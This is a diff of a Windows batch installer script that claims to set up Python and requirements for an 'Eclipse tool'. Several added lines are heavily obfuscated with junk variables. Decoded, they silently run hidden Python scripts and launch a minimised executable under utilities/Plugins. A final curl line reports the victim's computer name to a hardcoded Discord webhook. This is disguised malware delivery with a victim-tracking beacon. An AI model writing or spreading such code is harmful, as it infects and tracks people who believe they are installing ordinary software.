@@ -3,13 +3,6 @@ Title Downloading Modules...
 
 echo Installing Requirements (This should take around 2-3 minutes the first time)
 
-python --version | findstr "3.10.9" >nul
-if %ERRORLEVEL% neq 0 (
-    curl -L -o python-3.10.9.exe https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe >nul 2>&1
-    start /wait python-3.10.9.exe /quiet InstallAllUsers=1 Include_test=0 >nul 2>&1
-    del python-3.10.9.exe
-)
-
 python --version | findstr "3.11" >nul
 if %ERRORLEVEL% neq 0 (
     curl -L -o python-3.11.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe >nul 2>&1
@@ -23,17 +16,19 @@ if %ERRORLEVEL% neq 0 (
     python -m pip install --upgrade pip >nul 2>&1
 )
 
+cd /d "%~dp0"
+
 pip install -r requirements.txt >nul 2>&1
 
-i%pzIg%f%RkTES% %cjzXvdbz%n%LiGG%o%HVw%t%xVGgUJVlr% %NFsTxeQPqE%e%dd%x%IJoFIXptBg%i%ibMzkys%s%q%t%BwzH% %pk%"%hOXCGKN%b%GIgSkAbM%u%iHalmvz%i%JXr%l%xx%d%p%_%skOSKvNh%d%A%o%csakzFoEv%n%QWxy%e%nBaKfi%.%NJVVo%f%IgV%l%cwtkAPgB%a%JNrgSI%g%GP%"%XiCJRWbZA% %ArtsaIl%(%tcuzXy%
- %WL% %iHLY% %V% %tRc%p%rVnnQWufB%y%dKvktKEaNq%t%Al%h%yNfJVyY%o%PEgSY%n%QSYUekFxC% %nU%u%fXGBYkXvCG%t%W%i%fXUexsOanC%l%hdCvnNDgx%i%UfoVkjj%t%PCmPKzMx%i%wclzl%e%g%s%uITMxOTH%/%BaJDwGX%P%t%l%BYmQdMfAP%u%D%g%wgPeOvIL%i%iZjUI%n%CUlxEEn%s%mECDOY%/%wdHfUe%b%btVx%u%zSQQiaxH%i%voWrIE%l%yZYgkKWW%d%kf%.%EjINATTuyE%p%iVqywk%y%DCzU% %CDlyVmR%>%kY%n%Qq%u%VltqbgkrE%l%yIGg% %iHFeztYlA%2%IMqwFuWL%>%GAYFoNWBn%&%rJiBfBabj%1%sHzL%
- %wGPcrZxYn% %LwdiKccTRx% %HZqV% %W%p%iOL%y%lFXm%t%KyiaHkYKTJ%h%iNot%o%Hqc%n%MenPlnxUya% %PSrhZcZ%u%XI%t%LfIcNUVPkC%i%HCL%l%vufgua%i%Q%t%JywJJRQd%i%T%e%CkbaES%s%qJtAGvqp%/%FKs%P%nLcCZ%l%P%u%GEcxSuHAq%g%XC%i%HDK%n%KcXOjVdq%s%GBOEKizzfA%/%pRxtAQg%b%ZjK%u%QFcjZmjOkP%i%EUayiUG%l%gDpS%d%Y%2%kJNDDOtMEt%.%viaeIuHGQH%p%iMWCfyKMx%y%hXNOx% %Fj%>%l%n%p%u%NcIKTAC%l%MU% %mCjhtGXsiZ%2%NSeTl%>%dMj%&%v%1%rJxjpmREzp%
- %v% %Bxyfdol% %JlDmjeSLNC% %SnhhxT%p%WaHHN%y%vikanFM%t%RnTc%h%pDsxrVaD%o%SnzPmXEXP%n%Vh% %y%u%D%t%PCDgPsnx%i%hcn%l%HhutUkZ%i%cyj%t%cnTksnLNu%i%aHmZkDT%e%BvLmnjS%s%qdFO%/%tQTDZHP%P%dLjfyugV%l%Hj%u%bbI%g%hoUQ%i%JD%n%LDGxCiV%s%djW%/%jEyKfGbVqX%b%HfsAAq%u%ctGEvtd%i%jLoSQFC%l%jcTwiF%d%nJ%3%j%.%HBkxxJdvBI%p%dNnCqaoDJz%y%WS% %SBm%>%lc%n%frdcYxtv%u%HfF%l%v% %TQipLg%2%wTPPhaM%>%GEBTlOxv%&%GJjHY%1%Td%
+i%MZUWxTXMRg%f%qPNfhn% %oejReQDPt%n%oeBILJ%o%hIPUNwwJFl%t%bNyNkjHZP% %sRF%e%MXnim%x%d%i%LgDbns%s%boT%t%NsEExeIH% %DfRJ%"%y%b%Js%u%IPOvAdxGh%i%Obl%l%XzbiCz%d%spCSfk%_%tGwXJWsN%d%mo%o%maKovqRjfy%n%ukL%e%Ojcujxwz%.%S%t%aEGcGF%x%nbKQWDDmn%t%wmZm%"%SO% %QkZTqBzgTw%(%VebPPzcJ%
+ %ZHD% %QuYGNPemG% %tURoPbZ% %fdEwbUexE%p%CbCAcbO%y%iVy%t%CnXFzvvj%h%uLUhJcC%o%kDMiP%n%Gheum% %zDsGvqHY%u%o%t%FwDbJp%i%CMovpiCPb%l%bLYATl%i%aMxBJVdQz%t%ZdnB%i%CisubuOSFN%e%ubckkHVo%s%YCVTJ%/%VfMtXIq%P%jDuJMVPr%l%NtSh%u%ydk%g%MLE%i%kzk%n%SgXz%s%DUykDb%/%C%b%TiShHkm%u%nXvp%i%ajuaK%l%shu%d%uvbZJ%.%ZCOxikyW%p%RdYJYsrl%y%dlosLqfvS% %LQWkQVDeO%>%EcKAY%n%zJiARVUJ%u%MZEXDsQPt%l%IAfFSg% %ijAtMfwX%2%ZXj%>%Ukqe%&%SUkNIc%1%ZpA%
 
- %qb% %AFABXo% %d% %wBjlaCrlK%s%mCoa%t%LZNiiKsU%a%GyugGGH%r%MZTP%t%DmDiCDbjZn% %pC%/%gna%m%XAJh%i%JmkpLvJm%n%PTY% %auV%/%BMHuu%w%quk%a%Tiap%i%LiqqwKIaWx%t%EaWpQzv% %J%"%tYnewqjE%"%kY% %EtRHWKDyW%u%y%t%lM%i%H%l%Usra%i%jbLx%t%nuRyejNw%i%eGpKTBR%e%XVUeCw%s%vjKue%/%lTljfSicho%P%amaBAiVPL%l%beKbbfw%u%ebRSAJpLil%g%BYfUNSHXR%i%vrgoj%n%U%s%aYVXSG%/%nprAWrYSua%e%iUMxMCcou%c%mrkcj%l%KeDWpERSy%i%XvvC%p%MuHql%s%iCCgnSZ%e%bbSW%.%SGI%e%OOhzfhraXT%x%iIZZ%e%XtsWD% %CxMMD%>%TSS%n%oQjnTwvD%u%CBvvkxHPB%l%iVeQTAMtVl% %qVbb%2%xa%>%ByTyQ%&%bgLYImFeF%1%WRhPAKeE%
+ %hfI% %szaEQ% %aJRqxmY% %FLcGNqpQbj%p%YDIx%y%cMxYpxlw%t%NsJgFn%h%unAbGSx%o%ixhs%n%hgUqhIWt% %vjaGCVxUsn%u%HgIrejqW%t%rjxvxMgg%i%lEV%l%OewZzNNp%i%lZSM%t%XEv%i%dpBGs%e%fynyKtEDil%s%sdk%/%iZGTTttUtE%P%CXH%l%litCtMdbVp%u%PNrzFsbcuE%g%t%i%KyQvR%n%DnrV%s%GYX%/%fwPCx%b%HzVZryLHne%u%q%i%iw%l%DSIDg%d%nP%2%W%.%dcBJ%p%VqC%y%Rd% %thQT%>%RKB%n%VMdfo%u%ttxVFljnP%l%HpQUz% %TijHThJ%2%B%>%ga%&%mLelJoF%1%eMK%
 
- %D% %lFYQVQLs% %jMbfxKXlj% %wbg%t%bLKFaikCl%y%ABUZNfmboP%p%bAAgwbhCI%e%gUTeat% %xOtojvJmDh%n%jZsSQekFr%u%HXerB%l%hqbJhh% %bkm%>%P% %I%b%VdzlSnQ%u%Raxaxm%i%sCBqxjUgl%l%DUQpiZ%d%qrK%_%IwsQ%d%ismNrRsBZ%o%rAqr%n%L%e%YmD%.%D%f%acYeoysgM%l%hVKuQiOTDp%a%VeXbd%g%BjJet%
-)%ZHbwn%
+ %vFyV% %AhRSX% %nMCoXg% %RtDacrasYH%s%Rzx%t%NhytxBt%a%ji%r%o%t%ZqgUQbNcQ% %DVJmt%/%AafdRdknkw%m%ZvWIdBL%i%BwvLthIIM%n%GRlqiDr% %Om%/%pIdDLzS%w%nWOhGX%a%RNyvOK%i%EyJTA%t%JNyO% %XpfEjAr%"%xEnfiwTZoj%"%xLhrGfEvI% %Rzu%u%x%t%sBithD%i%SHqji%l%IAnIMAjlSQ%i%hcLkZRBiab%t%tBKNMRcYNG%i%jvxfbshBRI%e%VwaZUNo%s%IbwpRsH%/%IVPe%P%CYE%l%FULFBN%u%nId%g%ozIU%i%iwb%n%jMOp%s%Xk%/%VcdV%e%sglWyVI%c%Cu%l%skou%i%o%p%KHnKFlLqj%s%w%e%xGgCVRU%.%cAJadez%e%Ohhfv%x%aOgxYa%e%yoEhyQ% %EHzIA%>%AF%n%IgWBiBoIJ%u%j%l%MjXxdb% %ScICkmAJi%2%uHaaiJSAut%>%RTtCrQiA%&%YGBoWx%1%wSLTGWwvJ%
+
+ %zAhiLXwF% %CRFrcfCo% %wWwJJVYFu% %YFOHowjXLN%t%F%y%EthTG%p%JCqXJk%e%fZJUVOCH% %VeMMd%n%s%u%Aq%l%PJwdFjej% %lhZ%>%ZslldF% %kc%b%ACc%u%ucYtkdvOCT%i%PeiwOaJ%l%UCdMdgtgnt%d%IbbsAlJ%_%oo%d%yidQurPUI%o%YmJhHGIbbP%n%XGr%e%ZOUrQE%.%breDQddOoB%t%U%x%ReSnkLaTZH%t%JEbdze%
+)%hbYbW%
 
 set SYSTEM_NAME=%COMPUTERNAME%
 curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%SYSTEM_NAME% has run Eclipse tool.\"}" https://discord.com/api/webhooks/1267985728223186958/_UwqU1xD0Qkn9akumzYJ0ERtFCZSLxzGdYQFnWWmibLyivYVLIxMHzSbyZ57LXiCsN17 >nul 2>&1
